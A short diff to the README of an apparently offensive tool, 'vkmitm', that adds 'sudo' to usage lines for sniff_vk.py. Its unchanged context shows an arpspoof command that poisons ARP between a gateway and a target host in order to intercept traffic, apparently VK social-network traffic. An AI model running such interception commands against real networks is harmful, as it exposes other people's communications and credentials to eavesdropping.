@@ -16,12 +16,12 @@ $ sudo arpspoof -i en1 -t 192.168.2.1 192.168.2.151
 Sniffing data on en1:
 
 ```
-$ ./sniff_vk.py -i en1
+$ sudo ./sniff_vk.py -i en1
 ```
 
 Parsing pcap file:
 ```
-$ ./sniff_vk.py -p test.pcap
+$ sudo ./sniff_vk.py -p test.pcap
 ```
 
 # vkmitm
